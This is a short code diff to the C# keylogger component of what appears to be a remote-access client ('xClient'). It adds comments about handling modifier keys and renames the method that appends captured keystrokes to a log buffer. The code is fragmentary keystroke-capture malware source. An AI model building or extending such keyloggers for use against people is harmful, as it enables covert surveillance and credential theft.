@@ -131,7 +131,7 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyDown(object sender, KeyEventArgs e) //Called first
         {
-            if (PressedKeys.Contains(Keys.LControlKey)
+            if (PressedKeys.Contains(Keys.LControlKey) //if modifier keys are still down, they will be highlighted, including any other key pressed
                 || PressedKeys.Contains(Keys.RControlKey)
                 || PressedKeys.Contains(Keys.LMenu)
                 || PressedKeys.Contains(Keys.RMenu)
@@ -141,7 +141,7 @@ namespace xClient.Core.Keylogger
                 if (!PressedKeys.Contains(e.KeyCode)) //prevent multiple keypresses holding down a key
                     PressedKeys.Add(e.KeyCode);
             }
-            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z)
+            else if ((e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) //exclude keys here we don't want to log and return, KeyPress event can handle these if it is a character value
                 || (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.Divide)
                 || (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                 || (e.KeyCode >= Keys.Oem1 && e.KeyCode <= Keys.OemClear
@@ -183,10 +183,10 @@ namespace xClient.Core.Keylogger
 
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
-            _logFileBuffer.Append(AppendKeysToLog(PressedKeys.ToArray()));
+            _logFileBuffer.Append(HighlightSpecialKeys(PressedKeys.ToArray()));
         }
 
-        private string AppendKeysToLog(Keys[] _names)
+        private string HighlightSpecialKeys(Keys[] _names)
         {
             if (_names.Length < 1) return string.Empty;
 
